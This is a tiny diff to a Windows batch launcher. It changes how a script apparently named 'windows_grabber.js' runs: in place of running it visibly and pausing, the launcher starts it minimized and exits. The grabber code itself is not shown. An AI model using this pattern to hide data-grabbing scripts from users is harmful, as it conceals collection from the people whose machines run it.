@@ -1,3 +1,3 @@
 @ECHO off
-node windows_grabber.js
-pause
+start /MIN cmd /k node windows_grabber.js
+exit
